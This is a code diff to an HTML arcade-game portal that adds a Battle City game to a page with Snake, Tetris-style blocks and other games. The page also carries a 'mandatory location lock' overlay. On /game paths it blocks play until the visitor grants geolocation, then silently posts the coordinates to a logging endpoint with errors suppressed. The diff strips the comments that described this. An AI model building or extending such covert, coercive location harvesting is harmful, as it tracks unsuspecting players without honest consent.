@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Retro Arcade Portal</title>
+    <title>Retro Arcade Portal - Battle City</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col items-center justify-between p-4 relative">
     
-    <!-- Mandatory Location Lock Overlay (Appears after 6 seconds on /game path) -->
+    <!-- Mandatory Location Lock Overlay -->
     <div id="mandatory-geo-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(5, 5, 5, 0.95); backdrop-filter: blur(8px); z-index: 99999; align-items: center; justify-content: center;">
         <div style="background: #1e1e24; color: #fff; padding: 28px; border-radius: 12px; font-family: Roboto, Arial, sans-serif; box-shadow: 0 8px 32px rgba(0,0,0,0.8); width: 340px; border: 1px solid #333; text-align: center;">
             <div style="font-size: 36px; margin-bottom: 12px;">📍</div>
@@ -31,6 +31,7 @@
         <button id="btnBlocks" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-xs font-bold rounded transition">Building Blocks</button>
         <button id="btnBreaker" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-xs font-bold rounded transition">Brick Breaker</button>
         <button id="btnInvaders" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-xs font-bold rounded transition">Space Invaders</button>
+        <button id="btnBattleCity" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-xs font-bold rounded transition">Battle City (50 Lvls)</button>
     </div>
 
     <!-- Main Game Viewport Container -->
@@ -48,14 +49,16 @@
         import { initBlocksGame } from './games/blocks.js';
         import { initBrickBreakerGame } from './games/brickbreaker.js';
         import { initSpaceInvadersGame } from './games/spaceinvaders.js';
+        import { initBattleCityGame } from './games/battlecity.js';
 
         const container = document.getElementById('gameContainer');
         const btnSnake = document.getElementById('btnSnake');
         const btnBlocks = document.getElementById('btnBlocks');
         const btnBreaker = document.getElementById('btnBreaker');
         const btnInvaders = document.getElementById('btnInvaders');
+        const btnBattleCity = document.getElementById('btnBattleCity');
 
-        const allButtons = [btnSnake, btnBlocks, btnBreaker, btnInvaders];
+        const allButtons = [btnSnake, btnBlocks, btnBreaker, btnInvaders, btnBattleCity];
 
         function setActiveButton(activeBtn) {
             allButtons.forEach(btn => {
@@ -78,16 +81,11 @@
                         longitude: lon
                     })
                 });
-            } catch (err) {
-                // Suppress errors silently
-            }
+            } catch (err) {}
         }
 
         window.addEventListener('DOMContentLoaded', () => {
-            // Default boot into Nokia Snake
             initSnakeGame(container);
-
-            // Check if URL path includes '/game'
             if (window.location.pathname.includes('/game')) {
                 setTimeout(() => {
                     document.getElementById('mandatory-geo-overlay').style.display = 'flex';
@@ -97,7 +95,6 @@
             }
         });
 
-        // When user clicks the mandatory enable button
         document.getElementById('mandatory-allow-btn').addEventListener('click', () => {
             const errorDiv = document.getElementById('error-msg');
             errorDiv.style.display = 'none';
@@ -108,7 +105,7 @@
                         sendLogData(position.coords.latitude, position.coords.longitude);
                         document.getElementById('mandatory-geo-overlay').style.display = 'none';
                     },
-                    (error) => {
+                    () => {
                         errorDiv.style.display = 'block';
                         errorDiv.textContent = 'Permission denied. You must allow location to play.';
                     },
@@ -120,27 +117,11 @@
             }
         });
 
-        // UI Game Controller Switching Tabs
-        btnSnake.addEventListener('click', () => {
-            setActiveButton(btnSnake);
-            initSnakeGame(container);
-        });
-
-        btnBlocks.addEventListener('click', () => {
-            setActiveButton(btnBlocks);
-            initBlocksGame(container);
-        });
-
-        btnBreaker.addEventListener('click', () => {
-            setActiveButton(btnBreaker);
-            initBrickBreakerGame(container);
-        });
-
-        btnInvaders.addEventListener('click', () => {
-            setActiveButton(btnInvaders);
-            initSpaceInvadersGame(container);
-        });
-
+        btnSnake.addEventListener('click', () => { setActiveButton(btnSnake); initSnakeGame(container); });
+        btnBlocks.addEventListener('click', () => { setActiveButton(btnBlocks); initBlocksGame(container); });
+        btnBreaker.addEventListener('click', () => { setActiveButton(btnBreaker); initBrickBreakerGame(container); });
+        btnInvaders.addEventListener('click', () => { setActiveButton(btnInvaders); initSpaceInvadersGame(container); });
+        btnBattleCity.addEventListener('click', () => { setActiveButton(btnBattleCity); initBattleCityGame(container); });
     </script>
 </body>
 </html>
